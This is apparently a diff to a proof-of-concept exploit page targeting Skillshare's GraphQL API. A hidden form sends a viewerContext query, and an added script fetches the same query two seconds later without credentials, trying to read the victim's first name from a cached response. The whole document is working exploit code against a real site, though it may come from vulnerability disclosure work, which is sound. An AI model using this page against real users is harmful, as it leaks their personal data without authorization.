@@ -4,7 +4,7 @@
   <script>history.pushState('', '', '/')</script>
     <form action="https://www.skillshare.com/api/graphql">
       <input type="hidden" name="query" value="query&#32;viewerContext&#40;&#36;isAuthenticated&#58;&#32;Boolean&#33;&#41;&#32;&#123;&#32;viewer&#32;&#64;include&#40;if&#58;&#32;&#36;isAuthenticated&#41;&#32;&#123;&#32;firstName&#32;&#125;&#32;&#125;" />
-      <input type="hidden" name="variables" value="{%22isAuthenticated%22:true}" />
+      <input type="hidden" name="variables" value="&#123;&#34;isAuthenticated&#34;&#58;true&#125;" />
       <input type="submit" value="Submit request" />
     </form>
   </body>
@@ -13,3 +13,24 @@
 
 
 
+<!-- Step2, Get Userdata without Auth(Using cache)-->
+<script>
+//delay for cached
+setTimeout(function (){
+  // get information without auth
+  $.ajax({
+      url: "https://www.skillshare.com/api/graphql?query=query%20viewerContext($isAuthenticated:%20Boolean!)%20{%20viewer%20@include(if:%20$isAuthenticated)%20{%20firstName%20}%20}&variables={%22isAuthenticated%22:true}",
+      type: "get",
+      xhrFields: {
+        withCredentials: false 
+      },
+      headers: {
+          "Accept":"application/json",
+          "Accept-Language":"ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3",
+      },
+      success: function (data) {
+          console.info(data);
+      }
+  });
+}, 2000);
+</script>
